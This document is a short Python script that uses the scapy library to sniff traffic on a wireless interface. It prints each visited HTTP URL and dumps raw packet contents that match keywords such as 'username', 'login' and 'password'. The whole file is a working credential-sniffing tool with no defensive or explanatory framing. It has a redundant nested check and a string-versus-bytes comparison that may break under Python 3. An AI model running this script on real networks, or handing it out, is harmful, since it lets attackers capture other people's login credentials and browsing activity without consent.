#!/bin/python3
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_function)


def packet_function(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
    if packet.haslayer(scapy.Raw):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "uname", "login", "password", "pass"]
            for key in keywords:
                if key in load:
                    print(packet[scapy.Raw].load)
                    break

sniff("wlan0")